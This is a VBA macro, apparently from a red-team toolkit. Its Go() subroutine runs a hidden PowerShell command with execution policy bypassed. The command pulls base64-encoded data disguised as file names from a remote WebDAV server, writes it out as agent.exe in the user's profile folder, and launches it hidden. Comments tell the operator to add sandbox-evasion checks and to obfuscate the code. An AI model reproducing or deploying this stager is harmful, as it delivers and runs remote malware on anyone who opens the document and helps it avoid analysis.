'-------------------------------------------------------------------------------
' Call this subroutine
'-------------------------------------------------------------------------------
Sub Go()
    Dim srv As String, cmd As String, upfl As String, f2 As String
    Dim res As Integer
    
	'--------------------------------------------------------------
	' Put here some sanbdox evasion tricks, for example:
	' - check for printers
	' - check for last opened documents
	' - make it specific and targeted
	' - Or simply check some of the available techniques here: https://github.com/mgeeky/RobustPentestMacro/blob/master/RobustPentestMacro.vbs
	'--------------------------------------------------------------
	
	'--------------------------------------------------------------
	' Obfuscate the following block with any combination of simple obfuscation tricks:
	' - split and reverse string
	' - use of the chr() function
	' - Or simply use the following tool: https://github.com/mgeeky/VisualBasicObfuscator
	'--------------------------------------------------------------
	srv = "<==== webdavdelivery.py SERVER IP OR FQDN ====>"
	
    upfl = Environ("UserProfile")
    f2 = upfl + "\agent.exe"
             
    ' Call the WebDav server and list files, place the result in a temporary file
    cmd = "powershell -exec bypass -c ""& {Set-Content -Path " + f2 + " -Value ([Convert]::FromBase64String(((cmd /c 'pushd \\" & srv & "\agent & dir /b /a-d & popd') -replace '`n|`r' -replace '_','/'))) -Encoding Byte}"""
    res = CreateObject("WScript.Shell").Run(cmd, 0, True)
    res = Shell(f2 + " " + srv, vbHide)
    
End Sub
